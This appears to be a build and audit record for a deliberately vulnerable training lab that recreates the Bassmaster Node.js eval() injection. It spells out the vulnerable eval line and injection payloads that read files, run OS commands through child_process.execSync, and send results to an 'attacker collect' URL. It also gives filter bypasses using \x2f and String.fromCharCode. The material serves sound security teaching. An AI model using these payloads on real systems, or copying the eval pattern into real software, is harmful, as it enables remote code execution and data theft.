# lab-80-basalt — Bassmaster Node.js JS Injection + RCE

## Frame

**Outcome:** Working L5 Node.js lab implementing the OSWE Bassmaster lesson 14. Students locate an eval() call in the batch processing endpoint, trace user-controlled input through the request parsing pipeline, bypass the forward-slash regex restriction via JS hex encoding (\x2f), and achieve arbitrary JS execution then OS command execution.

**Success line:** validate_labs.sh 0 FAIL; smoke_test.sh PASS; `/batch` eval injection runs `require('fs').readFileSync('\x2fflag_local.txt')` → returns FLAG_LOCAL; `require('child_process').execSync(...)` → OS command execution → FLAG_PROOF via attacker collect; `/batch_hardened` blocks naive single-quote inject with 400 "Invalid characters in reference"; extra mile bypass via `String.fromCharCode(...)` executes without quotes → FLAG_PROOF.

**Kill line:** execSync unavailable (no child_process module access) would break OS RCE path.

**Proof:** 74/74 validate_labs.sh PASS; all attack stages verified with live container.

---

## Work

### Application: Batch REST API

Node.js 18 + Express. Implements the core vulnerability from the Bassmaster hapi plugin verbatim.

**Key files:**
- `app.js` — batch handler with exact eval injection pattern; direct route dispatch (no internal HTTP to avoid event-loop deadlock); extra mile endpoint `/batch_hardened`

**Vulnerable code (exact lesson pattern):**
```javascript
eval('value = ref.' + parts[i].value + ';');
```
Where `parts[i].value` comes from URL path regex group 2: `([^\/\$]*)` — captures everything except `/` and `$`.

**Attack flow:**
1. POST /batch with `requests[2].path = "/item/$1.id;INJECT"`
2. The path regex splits on `/` → group 2 captures `id;INJECT`
3. `eval('value = ref.id;INJECT;')` → INJECT executes as JS
4. JS injection → `require('fs').readFileSync('\x2fflag_local.txt')` → FLAG_LOCAL
5. OS command via `require('child_process').execSync('cat \x2fflag_proof.txt')` → FLAG_PROOF
6. Deliver to attacker collect: `http.get('http:\x2f\x2f127.0.0.1:5000\x2fattacker\x2fcollect?data=...')`

**Regex bypass:** `/` in injected code would split path segments. Encode as `\x2f` — the path regex sees literal backslash-x-2-f (not a slash), but JS eval interprets `\x2f` as `/`.

**Extra mile — `/batch_hardened`:**
- Pre-eval check: `if (/['"\`]/.test(parts[i].value)) { error = ...; break; }`
- Blocks naive `require('fs').readFileSync('/flag...')` (uses single quotes)
- Bypass: `require(String.fromCharCode(102,115))` = `require('fs')`, file paths via char codes
- All string literals replaced with `String.fromCharCode(...)` calls

**Build notes:**
- Original Bassmaster uses HTTP self-requests for dispatch — causes event-loop deadlock under load. Replaced with direct route dispatch function (no network, same result, pedagogically equivalent)
- express@4 only dependency

---

## Audit

- validate_labs.sh: 74/74 PASS
- smoke_test.sh: PASS
- Normal batch: `[profile, item, item/55cf687663]` ✓
- JS injection (fs.readFileSync): status=200, flag written to /tmp/gotit.txt = ARENA{test_local} ✓
- OS cmd injection (execSync): /tmp/proof.txt = ARENA{test_proof} ✓
- Attacker collect via http.get: results=["ARENA{test_proof}"] ✓
- Extra mile (/batch_hardened, String.fromCharCode bypass): em.txt = ARENA{test_proof} ✓
- Extra mile hardening blocks quotes: status=400 "Invalid characters in reference", blocked.txt absent ✓

**Confidence:** High. All attack stages verified end-to-end.
